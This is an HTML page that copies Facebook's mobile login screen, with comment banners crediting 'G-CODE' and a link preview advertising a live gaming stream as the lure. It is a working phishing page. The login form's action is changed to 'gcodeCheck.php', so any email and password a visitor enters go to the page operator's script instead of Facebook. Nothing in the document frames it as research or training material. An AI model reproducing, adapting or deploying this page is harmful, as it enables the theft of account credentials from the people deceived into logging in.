<!--   SCRIPT BY G-CODE   -->
<!--      EDIT? CUPU      -->
<!--   www.g-code.web.id  -->
<html lang="en">
  <head>
    <title>Facebook | log in or sign up</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/fydrH0sdg8k.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="+jAKWHf" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/n9g6Q0kZdhT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yJ/l/0,cross/HNgZrBbH51G.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="F5kNww5" crossorigin="anonymous">
    <script id="u_0_f_4Z" nonce="">
      function envFlush(a) {
        function b(b) {
          for (var c in a) b[c] = a[c]
        }
        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
      }
      envFlush({
        "timeslice_heartbeat_config": {
          "pollIntervalMs": 33,
          "idleGapThresholdMs": 60,
          "ignoredTimesliceNames": {
            "requestAnimationFrame": true,
            "Event listenHandler mousemove": true,
            "Event listenHandler mouseover": true,
            "Event listenHandler mouseout": true,
            "Event listenHandler scroll": true
          },
          "isHeartbeatEnabled": true,
          "isArtilleryOn": false
        },
        "shouldLogCounters": true,
        "timeslice_categories": {
          "react_render": true,
          "reflow": true
        },
        "sample_continuation_stacktraces": true,
        "dom_mutation_flag": true
      });
    </script>
    <script nonce="">
      document.domain = 'facebook.com';
      /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) && location.replace(location.hash.substr(location.hash.indexOf("!") + 1));
    </script>
    <script nonce="">
      __DEV__ = 0;
    </script>
    <script id="u_0_g_Ct" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/byTcfKYX_dt.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="xWicgyd" nonce=""></script>
    <script id="u_0_d_TB" nonce="">
      CavalryLogger = window.CavalryLogger || function(a) {
        this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
          t_cstart: window._cstart
        }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
      }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
        this.is_detailed_profiler = a;
        return this
      }, CavalryLogger.prototype.setTTIEvent = function(a) {
        this.tti_event = a;
        return this
      }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
        d = d ? this.piggy_values : this.values;
        (typeof d[a] === "undefined" || c) && (d[a] = b);
        return this
      }, CavalryLogger.prototype.getLastTtiValue = function() {
        return this.lastTtiValue
      }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
        this.mark(a);
        var e = this.values.t_cstart || this.values.t_start;
        e = d ? e + d : CavalryLogger.now();
        this.setValue(a, e, b, c);
        this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
        return this
      }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
        console.timeStamp(a)
      } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
        this.piggy_values[a] = b;
        return this
      }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function(a) {
        typeof a === "undefined" && (a = CavalryLogger.id);
        CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
        return CavalryLogger.instances[a]
      }, CavalryLogger.setPageID = function(a) {
        if (CavalryLogger.id === 0) {
          var b = CavalryLogger.getInstance();
          CavalryLogger.instances[a] = b;
          CavalryLogger.instances[a].lid = a;
          delete CavalryLogger.instances[0]
        }
        CavalryLogger.id = a
      }, CavalryLogger.now = function() {
        return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
      }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources = function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js = function() {}, CavalryLogger.start_js_script = function() {}, CavalryLogger.done_js = function() {};
      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
      CavalryLogger.prototype.measureResources = function(a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
        b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
          c = "js_exec/" + a.name;
          this.ongoing_watch[c] = d
        }
      }, CavalryLogger.prototype.stopWatch = function(a) {
        if (this.ongoing_watch[a]) {
          var b = CavalryLogger.now(),
            c = b - this.ongoing_watch[a];
          this.bootloader_metrics[a] = c;
          var d = this.piggy_values;
          a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
          delete this.ongoing_watch[a]
        }
        return this
      }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
        var a = {};
        Object.values(window.CavalryLogger.instances).forEach(function(b) {
          b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
        });
        return a
      }, CavalryLogger.start_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
      }, CavalryLogger.start_js_script = function(a) {
        if (!a || !a.dataset) return;
        CavalryLogger.start_js([a.dataset.bootloaderHash || a.dataset.bootloaderHashClient])
      }, CavalryLogger.done_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
      }, CavalryLogger.prototype.profileEarlyResources = function(a) {
        for (var b = 0; b < a.length; b++) this.measureResources({
          name: a[b][0],
          type: a[b][1] ? "js" : ""
        }, "_EF_")
      };
      CavalryLogger.getInstance().log_resources = true;
      CavalryLogger.getInstance().setIsDetailedProfiler(true);
      window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <script id="u_0_e_tH" nonce="">
      (function _(a, b, c, d) {
        function e(a) {
          document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
        }

        function f(a, b) {
          document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
        }
        if (!a) {
          e(b);
          e(c);
          return
        }
        a = null;
        (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
        (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
        f(b, (a || window.devicePixelRatio || 1).toString());
        e = window.screen ? screen.width : 0;
        b = window.screen ? screen.height : 0;
        f(c, e + "x" + b);
        d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
      })(true, "m_pixel_ratio", "wd", false);
    </script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
    <meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
    <link rel="canonical" href="https://www.facebook.com/">
    <meta property="og:site_name" content="Facebook">
    <meta property="og:type" content="website">
    <meta property="og:title" content="🔴 LIVE OIR GAMES - SCRIM DADAKAN MIX SENIN">
    <meta property="og:description" content="scrim fun, buat latihan tim, tolong bantu support & shareny guys.">
    <meta property="og:image" content="https://scontent.fcgk8-1.fna.fbcdn.net/v/t39.30808-6/289177323_112021218211671_5501896851981327224_n.jpg?stp=cp0_dst-jpg_e15_fr_q65&_nc_cat=111&ccb=1-7&_nc_sid=8024bb&efg=eyJpIjoidCJ9&_nc_eui2=AeGYEYo13gjRcvd9rG8srqUqHEQsqq7M1xgcRCyqrszXGNEr1OcOCBj0Hhz3O8KTEwVwEHouxlK_unKu9HZKDpAo&_nc_ohc=-hYDAZHSjNkAX8J4BW-&_nc_zt=23&_nc_ht=scontent.fcgk8-1.fna&oh=00_AT9da8TGQdAMg3ZFbDUzIgxP8E4WmLsqtX4zLOo2eCAIYg&oe=62B5AA79">
    <meta property="og:url" content="https://www.facebook.com/">
    <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/">
    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/">
    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/">
    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/">
    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/">
    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/">
    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/">
    <link rel="alternate" hreflang="en" href="https://www.facebook.com/">
    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/">
    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/">
    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/">
    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/">
    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/">
    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/">
    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/">
    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/">
    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/">
    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/">
    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/">
    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/">
    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/">
    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/">
    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/">
    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/">
    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/">
    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/">
    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/">
    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/">
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/">
    <script id="u_0_h_yj" type="application/ld+json" nonce="">
      {
        "\u0040context": "http:\/\/schema.org",
        "\u0040type": "WebSite",
        "name": "Facebook",
        "url": "https:\/\/www.facebook.com\/"
      }
    </script>
    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="M5XDl+E"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="vF0qXZY"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="bJ922yg"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="FJqL2Al"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="t1KEUNA"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="FEt5GzN"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="MOwxiEu"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3ilqt4/yf/l/en_GB/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3ilqt4/yf/l/en_GB/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="txMBmcX"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/yS/l/en_GB/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/yS/l/en_GB/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="hMoWeWt"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3islK4/yo/l/en_GB/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3islK4/yo/l/en_GB/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="w5JLkSF"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/1oQewAX3PWu.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/1oQewAX3PWu.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="EdRhDux"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/yk/l/en_GB/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/yk/l/en_GB/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="NfvTfKe"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3idKW4/yl/l/en_GB/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3idKW4/yl/l/en_GB/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="HPolq9r"></script>
  </head>
  <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255); min-height: 825px;">
    <script id="u_0_c_Mo" nonce="">
      (function(a) {
        a.__updateOrientation = function() {
          var b = !!a.orientation && a.orientation !== 180,
            c = document.body;
          c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
          return b
        }
      })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 825px;">
      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
      <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 825px;">
          <div class="_7om2">
            <div class="_4g34" id="u_0_0_9x">
              <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                <div class="_52jd"></div>
              </div>
              <div class="_9om_">
                <div class="_4-4l">
                  <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                  <div class="_7om2 _52we _2pid _52z6">
                    <div class="_4g34">
                      <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU1MjE4MzU1LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook">
                      </a>
                    </div>
                  </div>
                  <div class="_5rut">
                    <form method="post" action="gcodeCheck.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_4">
                      <div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div class="_96n9" id="email_input_container">
                              <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Phone number or email address" type="text" data-sigil="m_login_email">
                            </div>
                          </div>
                        </div>
                        <div class="_55wq"></div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div class="_1upc _mg8" data-sigil="m_login_password">
                              <div class="_7om2">
                                <div class="_4g34 _5i2i _52we">
                                  <div class="_5xu4">
                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
                                  </div>
                                </div>
                                <div class="_5s61 _216i _5i2i _52we">
                                  <div class="_5xu4">
                                    <div class="_2pi9" style="display:none" id="u_0_1_Ev">
                                      <a href="#" data-sigil="password-plain-text-toggle">
                                        <span class="mfss" style="display:none" id="u_0_2_Ff">HIDE</span>
                                        <span class="mfss" id="u_0_3_37">SHOW</span>
                                      </a>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
<!--   SCRIPT BY G-CODE   -->
<!--      EDIT? CUPU      -->
<!--   www.g-code.web.id  -->
                      <div class="_2pie" style="text-align:center;">
                        <div id="login_password_step_element" data-sigil="login_password_step_element">
                          <button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu">
                            <span class="_55sr">Log In</span>
                          </button>
                        </div>
                        <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                        <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                        <div id="otp_button_elem_container"></div>
                      </div>
                      <input type="hidden" name="prefill_contact_point" id="prefill_contact_point">
                      <input type="hidden" name="prefill_source" id="prefill_source">
                      <input type="hidden" name="prefill_type" id="prefill_type">
                      <input type="hidden" name="first_prefill_source" id="first_prefill_source">
                      <input type="hidden" name="first_prefill_type" id="first_prefill_type">
                      <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false">
                      <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false">
                      <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false">
                      <input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0">
                      <input type="hidden" id="scetoggle">
                      <div class="_xo8"></div>
                      <noscript>
                        <input type="hidden" name="_fb_noscript" value="true" />
                      </noscript>
                    </form>
                    <div>
                      <div class="_2pie _9omz">
                        <div class="_52jj _9on1">
                          <a class="_9on1" tabindex="0" href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU1MjE4MzU1LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Forgotten password?</a>
                        </div>
                      </div>
                      <div style="padding-top: 42px">
                        <div>
                          <div>
                            <div>
                              <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
                                <span class="_43mh">or</span>
                              </div>
                              <div class="_52jj _5t3b" id="signup_button_area">
                                <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_2">Create New Account</a>
                              </div>
                            </div>
                          </div>
                          <div class="_2pie" style="text-align:center;">
                            <div>
                              <div data-sigil="login_identify_step_element"></div>
                              <div class="other-links _8p_m">
                                <ul class="_5pkb _55wp">
                                  <li></li>
                                </ul>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div style="display:none"></div>
          <span>
            <img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none">
          </span>
          <div class="_55wr _5ui2" data-sigil="m_login_footer">
            <div class="_5dpw">
              <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                <div class="_7om2">
                  <div class="_4g34">
                    <span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=jv_ID&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=jv_ID&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Basa Jawa</a>
                      </span>
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=ja_JP&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=ja_JP&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">æ—¥æœ¬èªž</a>
                      </span>
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">PortuguÃªs (Brasil)</a>
                      </span>
                    </div>
                  </div>
                  <div class="_4g34">
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=id_ID&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=id_ID&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Bahasa Indonesia</a>
                      </span>
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Bahasa Melayu</a>
                      </span>
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc">
                        <a href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">EspaÃ±ol</a>
                      </span>
                    </div>
                    <a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
                      <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language">
                        <i class="img sp_lb_GJ13ifiY sx_d99617"></i>
                      </div>
                    </a>
                  </div>
                </div>
              </div>
              <div class="_5ui4">
                <div class="_96qv _9a0a">
                  <a href="https://about.facebook.com/?refid=8" class="_96qw" title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                  <span aria-hidden="true"> Â· </span>
                  <a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Visit our Help Centre.">Help</a>
                  <span aria-hidden="true"> Â· </span>
                  <span class="_96qw" id="u_0_4_Y5">More</span>
                </div>
                <div class="_96qv" style="display:none" id="u_0_5_lQ">
                  <a href="https://messenger.com/" title="Take a look at Messenger." class="_96qw">Messenger</a>
                  <a href="/lite/?refid=8" title="Facebook Lite for Android." class="_96qw">Facebook Lite</a>
                  <a href="https://m.facebook.com/watch/?refid=8" title="Browse our Watch videos." class="_96qw">Watch</a>
                  <a href="/places/?refid=8" title="Take a look at popular places on Facebook." class="_96qw">Places</a>
                  <a href="/games/?refid=8" title="Check out Facebook games." class="_96qw">Games</a>
                  <a href="/marketplace/?refid=8" title="Buy and sell on Facebook Marketplace." class="_96qw">Marketplace</a>
                  <a href="https://pay.facebook.com/?refid=8" title="Learn more about Facebook Pay" target="_blank" class="_96qw">Facebook Pay</a>
                  <a href="https://www.oculus.com/" title="Learn more about Oculus" target="_blank" class="_96qw">Oculus</a>
                  <a href="https://portal.facebook.com/?refid=8" title="Learn more about Facebook Portal" target="_blank" class="_96qw">Portal</a>
                  <a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0vuondtiFP4BHWakxYO0KbkMdcKRhKtT6vRLlIKTSNlWt4DoNcOwa7en29jqbApGw07kr8WIgLRDpPop1xhXc7cgcEZx6FmmKW9JKFnUAzbd4X4hU24WmhnvrqZgmhTNHm3ZI5yixTp5SH8_goNqIlPl_FMaQRG70KAQ" title="Take a look at Instagram" target="_blank" class="_96qw" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a>
                  <a href="https://www.bulletin.com/" title="Take a look at Bulletin newsletter" class="_96qw">Bulletin</a>
                  <a href="/local/lists/245019872666104/?refid=8" title="Browse our Local Lists directory." class="_96qw">Local</a>
                  <a href="/fundraisers/?refid=8" title="Donate to worthy causes." class="_96qw">Fundraisers</a>
                  <a href="/biz/directory/?refid=8" title="Browse our Facebook Services directory." class="_96qw">Services</a>
                  <a href="https://developers.facebook.com/?ref=pf&amp;refid=8" title="Develop on our platform." class="_96qw">Developers</a>
                  <a href="/careers/?ref=pf&amp;refid=8" title="Make your next career move to our brilliant company." class="_96qw">Careers</a>
                  <a href="/privacy/explanation?refid=8" title="Learn about your privacy and Facebook." class="_96qw">Privacy</a>
                  <a href="/groups/explore/?refid=8" title="Explore our groups." class="_96qw">Groups</a>
                </div>
                <span class="mfss fcg">Meta Â© 2022</span>
              </div>
            </div>
          </div>
        </div>
        <div class=""></div>
        <div class="viewportArea _2v9s" style="display:none" id="u_0_6_M7" data-sigil="marea">
          <div class="_5vsg" id="u_0_7_Qi" style="max-height: 960px;"></div>
          <div class="_5vsh" id="u_0_8_2w" style="max-height: 456px;"></div>
          <div class="_5v5d fcg">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
          </div>
        </div>
